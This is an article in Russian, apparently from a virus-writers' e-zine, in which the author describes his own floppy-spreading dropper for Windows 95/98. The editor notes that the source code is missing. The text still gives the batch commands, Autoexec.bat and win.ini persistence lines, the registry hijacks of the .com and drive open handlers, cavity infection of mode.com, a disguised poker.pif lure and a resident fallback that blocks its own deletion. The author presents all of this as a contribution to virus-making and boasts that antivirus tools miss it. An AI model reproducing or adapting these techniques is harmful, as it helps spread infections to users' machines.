
▐█ █▐▀█▄▐▀█ ▀▐▀▀▌▀█▄▐▀▀▌    ▄▄▄█▀█
 █ █▐  █▐▄█▌█▐  ▄  █▐       █▄▄▄▄    ▄     Dropper
 █▄█▐▄▄█▐  █▐▐  █▄▄█▐       ▀   ▀█  
▐█ █▐▄ █▐▄██▐▐▄ █▄ █▐▄      ▀█▄▄█▀   ▀     (c) DedBoyz
==============================================================================

(*от редактора: к сожалению человек приславший статью прислал битый архив
  и на мой повторный запрос не отозвался, поэтому есть только вот это опи-
  сание, а код отсутствует. Если автор читает этои строки, то пусть он выш-
  лет еще раз свой исходник, он будет опубликовн в следующем номере *)


 Привет!
 
 Тут посетил ваш сайт и решил внести свой вклад в развитие вирмэйкерства.
 
 Где-то два года назад я написал дропер под VVinD0vv$ 95/98/NT (хотя на НТ не
 тестил, но там по идее все тоже, так что должно и там работать). Суть допера
 в том, чтобы подкинуть себя на дискету. Принцип работы такой:
   при запуске кидает себя в корень на диск С: как DAT файл (на всякий случай,
   от всяких там вебов и т.д.) и первыми строчками вставлял в Autoexec.bat:
   @rename c:\file.dat *.com>nul
   @file.com E
   @regedit c:\add.reg>nul         (возможно что нужно запускать с ключом)
 после запуска ком файла, тот заражает mode.com в каталоге %windir%\command\
 сажаясь в нули, тем самым не увеличивая длинны файла (но на случай если бы
 этих нулей там небыло, было предусмотрено простое заражение с дописыванием в
 конец файла) и создает add.reg которой содержит:
 
 REGEDIT4
  
 [HKEY CLASSES ROOT\comfile\shell\open\command]
 @="OpenCom.Bat %1"
  
 [HKEY CLASSES ROOT\Drive\shell\open\command]
 @="Drive.Pif %1"

 также создает файл Drive.pif и drive.bat, copyfile.bat & opencom.bat
 и удаляет в SendTo линк файл Диск А:.lnk и создает в замен Диск А.pif 
 Создает в Виндовом каталоге файл WinDLL.com & WinSys.com и правит в win.ini
 строку load=winsys.com
 
 Далее происходит загрузка винды и вызывается winsys.com (хотя можно было
 сделать и не так, но в тот момент меня потянуло на изврат) который удаляет
 строки в ауто бате и файл add.reg.
  
 Теперь существует три варианта скинуться на дискету:
  
 1. при отправлении на диск А файла вызовется свернутый пиф файл который в
    свою очередь запустит copyfile.bat его содержимое:
    @WinDLL A
    @if exist NoError.$ copy %1 A:>nul
    @if exist NoError.$ del NoError.$>nul
    параметр А подразумевает что дискета точно есть и если она есть, то windll
    создает файл noerror.$, чтобы не зависло окно если диск не будет вставлен
    и соответственно дропаем себя
  
 2. при запуске COM файла запуститься OpenCom.bat:
    @windll X
    %1
    параметр Х означает что нужно проверить "текущий диск не А ли случаем", и
    если А то дропимся, далее запускается файл который запускался. Также эта
    фишка для того чтобы не инсталится второй раз на комп дроперу.
  
 3. при открытии Мой комп и далее при открытии диска вызывается свернутый
    drive.pif который запускает drive.bat:
    @if %1==A:\ WinDLL A
    @Explorer %1
    если диск А то надеюсь все понятно.
  
 Конечно опытный человек сразу просечет в чем здесь фишка, но испытания
 показали что большинству по барабану что кратковременно появляется свернутое
 окно, что если эксплорер при открытии кой либо шняги работает в одном окне,
 а при открытии диска вызывается новое окно...
  
 Что скидывает на дискету дропер?
 Он скидывает файл poker.com & poker.pif, пиф файл вызывает A:\poker.com, а
 иконка у пифа pifmgr.dll с номером иконки где изображены карты.
  
 Кстати если дропер не находит винды, то инсталиться в ауто ват
 @lh c:\wc.com D   -  т.е. перехватывает 21-е прерывание и ждет дискет,
 блокирует удаление себя.
  
 Антивирусы не определяют соответственно, т.к. такой изврат они еще не видели
 наверно.
  
 Ну вроде все. Пока, удачи всем в столь непростом деле!
  
 P.S. Недавно написал под винду вирь, но он заражает только NE, а с PE еще
      разбираюсь.
  
